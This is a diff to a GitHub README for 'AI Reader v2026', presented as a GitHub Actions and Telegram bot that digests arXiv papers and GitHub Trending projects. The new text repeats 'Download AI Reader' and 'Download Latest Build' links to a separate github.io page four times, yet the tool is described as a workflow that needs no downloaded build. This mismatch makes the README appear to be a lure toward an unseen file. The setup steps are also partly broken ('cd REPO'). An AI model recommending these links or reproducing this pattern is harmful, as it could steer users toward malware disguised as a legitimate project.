@@ -1,15 +1,124 @@
-# Ai Reader Llm Digest
+# AI Reader v2026 - Daily AI Research Digest Bot
 
-Project documentation and reference notes for this repository.
+> **AI Reader is a Telegram and GitHub Actions digest system for monitoring arXiv research and GitHub Trending projects, evaluating them with an LLM, and sending daily AI engineering updates in version 2026.**
 
-## Overview
+[![Platform](https://img.shields.io/badge/Platform-GitHub%20Actions%20/%20Telegram-blue?style=flat-square)](https://github.com)
+[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
+[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
+[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
+[![Stars](https://img.shields.io/github/stars/danielcooperadk7920/ai-reader-llm-digest?style=flat-square)](https://github.com/danielcooperadk7920/ai-reader-llm-digest)
 
-This repository contains setup notes, release references, and configuration details.
+---
 
-## Usage
+<p align="center">
+  <a href="https://danielcooperadk7920.github.io/ai-reader-llm-digest/">
+    <img src="https://img.shields.io/badge/Download-AI%20Reader%20Latest-brightgreen?style=for-the-badge" alt="Download AI Reader">
+  </a>
+</p>
 
-Review the project files and documentation for setup information.
+> **[Download AI Reader v2026](https://danielcooperadk7920.github.io/ai-reader-llm-digest/)**
+
+---
+
+[Download Latest Build](https://danielcooperadk7920.github.io/ai-reader-llm-digest/)
+
+---
+
+## What AI Reader Does
+
+Keeping up with AI engineering requires following both academic work and rapidly changing developer tools. AI Reader brings those sources together by collecting arXiv papers and discovering repositories from GitHub Trending, then organizing the results into a daily digest.
+
+Its workflow is centered on scheduled automation. GitHub Actions gathers the latest entries, uses LLM-powered checks to assess relevance and importance, and produces an HTML report with a concise summary. High-value findings can also be delivered through Telegram notifications.
+
+---
+
+## Included Capabilities
+
+- Produces a new arXiv paper digest each day
+- Collects and evaluates repositories from GitHub Trending
+- Applies LLM-based relevance and importance analysis
+- Sends Telegram notifications for items with high scores
+- Runs the daily collection process automatically with GitHub Actions
+- Creates an HTML report for reading and review
+- Concentrates collection on AI engineering subjects
+- Presents results in a digest format designed for fast scanning
+
+---
+
+## Getting Started
+
+First, check out the repository and move into its directory:
+
+- `git clone https://github.com/danielcooperadk7920/ai-reader-llm-digest.git
+- `cd REPO`
+
+For automated operation, configure the necessary GitHub Actions settings. Once configured, the workflow can run on its schedule or be launched manually from the Actions tab.
+
+---
+
+## Daily Workflow
+
+AI Reader generally processes information in this order:
+
+1. Retrieve new papers from arXiv and repositories listed in GitHub Trending.
+2. Evaluate each entry using the configured LLM relevance logic.
+3. Generate the HTML digest and its summary output.
+4. Notify Telegram when an entry reaches the configured high-score threshold.
+5. Read through the resulting digest and investigate the most useful leads.
+
+To perform a manual run, update the configuration and secrets as needed, then start the workflow from GitHub Actions.
+
+---
+
+## Settings
+
+Configuration is primarily supplied through repository files and GitHub Actions environment values. The main areas you can adjust are:
+
+- arXiv query coverage
+- GitHub Trending collection behavior
+- scoring prompts and threshold values
+- Telegram bot token and destination chat
+- workflow scheduling
+
+A representative configuration uses variables like these:
+
+    TELEGRAM_BOT_TOKEN=your_token_here
+    TELEGRAM_CHAT_ID=your_chat_id_here
+    LLM_SCORE_THRESHOLD=0.8
+
+Keep sensitive values in GitHub Actions secrets instead of committing them to the repository.
+
+---
+
+## Requirements
+
+- A GitHub repository with Actions enabled
+- Telegram bot credentials for sending notifications
+- Access to arXiv and GitHub Trending
+- A workflow runner that supports scheduled automation
+- HTML output capability for rendering the digest
+
+---
+
+## Frequently Asked Questions
+
+**What is the execution schedule?**  
+AI Reader is intended to run once per day through an automated GitHub Actions workflow.
+
+**Can the collection scope be customized?**  
+Yes. Adjust the workflow configuration, query options, and scoring rules to control what appears in the digest.
+
+**What should I check if Telegram messages do not arrive?**  
+Confirm the bot token and chat ID, verify that the workflow secrets are set correctly, and check whether any collected items exceeded the notification threshold.
+
+**Where is the digest available after a run?**  
+Open the HTML report generated by the workflow, along with any artifacts or published pages configured for your project.
+
+**How can I investigate a failed workflow?**  
+Start with the GitHub Actions logs. Then check source API access, schedule configuration, and the variables used for scoring and Telegram notifications.
+
+---
 
 ## License
 
-See [LICENSE](LICENSE).
+GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
